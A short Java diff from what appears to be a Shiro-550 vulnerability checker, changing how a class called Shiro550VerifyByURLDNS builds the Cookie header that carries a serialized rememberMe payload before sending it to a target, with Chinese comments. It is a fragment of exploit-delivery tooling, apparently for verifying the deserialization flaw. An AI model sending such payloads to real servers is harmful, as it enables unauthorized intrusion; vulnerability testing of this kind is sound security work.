@@ -33,7 +33,7 @@ public class Shiro550VerifyByURLDNS {
 //        System.out.println(payload);
         // 在自定义Cookie后添加Cookie字段(cookie;rememberMe=test123)
         Map<String, String> headers = new HashMap<>();
-        headers.put("Cookie", ";" + targetOBJ.getRememberMeFlag() + "=" + payload);
+        headers.put("Cookie", targetOBJ.getRememberMeFlag() + "=" + payload);
 
         // 发送payload
         HttpRequest.httpRequest(targetOBJ, new FormBody.Builder().build(), headers, "GET");
